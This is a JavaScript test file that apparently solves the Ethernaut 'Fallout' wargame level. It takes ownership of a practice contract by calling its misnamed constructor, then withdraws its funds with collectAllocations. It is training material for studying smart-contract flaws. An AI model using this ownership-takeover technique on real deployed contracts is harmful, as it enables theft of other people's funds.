const { expect } = require("chai");
const { Contract, Signer } = require("ethers");
const { ethers, waffle } = require("hardhat");
const { createChallenge, submitLevel } = require("./utils");

const abi = [
  {
    inputs: [],
    name: "Fal1out",
    outputs: [],
    stateMutability: "payable",
    type: "function",
    payable: true,
    signature: "0x6fab5ddf",
  },
  {
    inputs: [],
    name: "allocate",
    outputs: [],
    stateMutability: "payable",
    type: "function",
    payable: true,
    signature: "0xabaa9916",
  },
  {
    inputs: [{ internalType: "address", name: "allocator", type: "address" }],
    name: "allocatorBalance",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
    constant: true,
    signature: "0xffd40b56",
  },
  {
    inputs: [],
    name: "collectAllocations",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
    signature: "0x8aa96f38",
  },
  {
    inputs: [],
    name: "owner",
    outputs: [{ internalType: "address payable", name: "", type: "address" }],
    stateMutability: "view",
    type: "function",
    constant: true,
    signature: "0x8da5cb5b",
  },
  {
    inputs: [
      { internalType: "address payable", name: "allocator", type: "address" },
    ],
    name: "sendAllocation",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
    signature: "0xa2dea26f",
  },
];

const contractLevel = "0xd8630853340e23CeD1bb87a760e2BaF095fb4009";

before(async () => {
  [eoa] = await ethers.getSigners();
  challengeAddress = await createChallenge(contractLevel);
  //   const artifact = await artifacts.readArtifact("Fal1out");
  challenge = new ethers.Contract(challengeAddress, abi, eoa);
  console.log(`eoa address: ${JSON.stringify(eoa.address)}`);
});

it("solves the challenge", async () => {
  // 1a) Check who owner is
  var owner = await challenge.owner();
  console.log(`owner1: ${JSON.stringify(owner)}`);
  // Turns out the owner is 0x000 - there isn't one.

  // 1b) Call incorrectly named constructor
  const tx = await challenge.Fal1out();
  const txRt = await tx.wait(1);
  console.log(`txRt: ${JSON.stringify(txRt)}`);

  // 1c) Check owner address
  owner = await challenge.owner();
  console.log(`owner2: ${JSON.stringify(owner)}`);
  // Owner is now: 0x9230E95a291290b4478D45AFD6533142cA5602cf
  // which is eoa address.

  // 2a) Check contract balance
  let provider = await ethers.getDefaultProvider();
  let contractBalance = await provider.getBalance(challenge.address);
  console.log(`contractBalance: ${JSON.stringify(contractBalance)}`);
  // Balance is 0 - probably because nothing has been sent to it.

  //  2b) Call collectAllocations
  const tx2 = await challenge.collectAllocations();
  const txRt2 = await tx2.wait(1);
  console.log(`txRt2: ${JSON.stringify(txRt2)}`);
});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
